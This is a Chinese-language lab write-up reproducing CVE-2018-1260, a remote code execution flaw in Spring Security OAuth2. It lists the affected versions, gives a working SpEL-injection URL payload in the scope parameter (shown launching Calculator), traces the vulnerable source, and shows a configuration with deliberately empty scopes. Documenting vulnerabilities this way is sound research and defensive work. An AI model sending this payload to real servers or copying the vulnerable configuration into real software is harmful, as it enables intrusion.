## Spring-security-oauth2 远程代码执行漏洞cve-2018-1260

#### 1.漏洞简介

	严重漏洞,在Spring Security OAuth 2.x老的版本中，恶意用户可以向授权服务器发起授权请求，当转发至授权审批终端 *（Approval Endpoint）* 时，会导致远程代码执行漏洞的攻击。攻击发生需要满足的条件：被攻击端作为授权服务器时 *（如使用了 @EnableAuthorizationServer 注解）* 使用了默认审批终端，或重写的审批终端逻辑中使用 `SpelExpressionParser` 等对输出内容进行SPEL表达式解析未配置Scopes

受影响版本:

Spring Security OAuth 2.3到2.3.2

Spring Security OAuth 2.2到2.2.1

Spring Security OAuth 2.1到2.1.1

Spring Security OAuth 2.0到2.0.14

#### 2.漏洞复现

============================搭建靶机环境============================

（1）登陆mysql

```
mysql -u root -p
```

（2）导入sql文件

```
source spring-oauth.sql
```

（3）运行jar文件

```
java -jar cve-2018-1260.jar
```

============================攻击机访问===============================

靶机ip：8080/oauth/authorize?client_id=client&response_type=code&redirect_uri=http://localhost&scope=%24%7BT%28java.lang.Runtime%29.getRuntime%28%29.exec%28%22/Applications/Calculator.app/Contents/MacOS/Calculator%22%29%7D

============================攻击效果=================================

靶机弹出3个计算器

#### 3.漏洞原理

先简要补充一下关于OAuth2.0的相关知识。

[![img](https://xzfile.aliyuncs.com/media/upload/picture/20180511125525-84bff88e-54d7-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20180511125525-84bff88e-54d7-1.png)

以上图为例。当用户使用客户端时，客户端要求授权，即图中的AB。接着客户端通过在B中获得的授权向认证服务器申请令牌，即access token。最后在EF阶段，客户端带着access token向资源服务器请求并获得资源。

在获得access token之前，客户端需要获得用户的授权。根据标准，有四种授权方式：授权码模式（authorization code）、简化模式（implicit）、密码模式（resource owner password credentials）、客户端模式（client credentials）。在这几种模式中，当客户端将用户导向认证服务器时，都可以带上一个可选的参数`scope`，这个参数用于表示客户端申请的权限的范围。根据[官方文档](http://projects.spring.io/spring-security-oauth/docs/oauth2.html)，在spring-security-oauth的默认配置中scope参数默认为空.

###### 1.入口参数传输到AuthorizationRequest

![屏幕快照 2018-09-03 下午6.53.21](https://github.com/girlkb/myVulnerabilityRecurrence/blob/master/spring/cve-2018-1260/1.png)

###### 2.校验scope变量

```
private void validateScope(Set<String> requestScopes, Set<String> clientScopes) {
        if (clientScopes != null && !clientScopes.isEmpty()) {//如果前面的.scopes()不为空
            Iterator var3 = requestScopes.iterator();//进行白名单检查

            while(var3.hasNext()) {
                String scope = (String)var3.next();
                if (!clientScopes.contains(scope)) {
                //如果之前配置.scopes("cc"),则request中scopes必须为cc，否则报错invalid scope:xxx
                    throw new InvalidScopeException("Invalid scope: " + scope, clientScopes);
                }
            }
        }

        if (requestScopes.isEmpty()) {
            throw new InvalidScopeException("Empty scope (either the client or the user is not allowed the requested scopes)");
        }
    }
```

###### 3.校验完scope参数，再完成各项检查和配置之后，在authorize函数的最后执行

![](https://github.com/girlkb/myVulnerabilityRecurrence/blob/master/spring/cve-2018-1260/2.png)

4.跟进授权过程

![屏幕快照 2018-09-03 下午7.09.48](https://github.com/girlkb/myVulnerabilityRecurrence/blob/master/spring/cve-2018-1260/3.png)

生成对应的model和view，之后会forword到/oauth/confirm_access。（中间的调用过程太多，直接看调用栈吧）

![屏幕快照 2018-09-03 下午7.15.41](https://github.com/girlkb/myVulnerabilityRecurrence/blob/master/spring/cve-2018-1260/4.png)

然后定位到

![6](https://github.com/girlkb/myVulnerabilityRecurrence/blob/master/spring/cve-2018-1260/5.png)

可以看到render时通过*helper*取${}中的值作为表达式，再用*replacePlaceholders*来执行![屏幕快照 2018-09-03 下午7.33.11](https://github.com/girlkb/myVulnerabilityRecurrence/blob/master/spring/cve-2018-1260/6.png)

```
public String replacePlaceholders(String value, PropertyPlaceholderHelper.PlaceholderResolver placeholderResolver) {
    Assert.notNull(value, "'value' must not be null");
    return this.parseStringValue(value, placeholderResolver, new HashSet());
}
```

![7](https://github.com/girlkb/myVulnerabilityRecurrence/blob/master/spring/cve-2018-1260/7.png)

根据template生成对应的SpelView对象，这是其构造函数，在页面渲染过程中，会执行Spel表达式，造成代码执行

![](https://github.com/girlkb/myVulnerabilityRecurrence/blob/master/spring/cve-2018-1260/8.png)

Spel表达式通过反射执行代码

![21](https://github.com/girlkb/myVulnerabilityRecurrence/blob/master/spring/cve-2018-1260/9.png)



参考：https://xz.aliyun.com/t/2330

jar文件代码是修改自：https://github.com/wanghongfei/spring-security-oauth2-example.git

进入spring-security-oauth2-example，修改 cn/com/sina/alan/oauth/config/OAuthSecurityConfig.java的第67行:

```
@Override
    public void configure(ClientDetailsServiceConfigurer clients) throws Exception {
       clients.inMemory()
                .withClient("client")
                .authorizedGrantTypes("authorization_code")
                .scopes();
    }
```

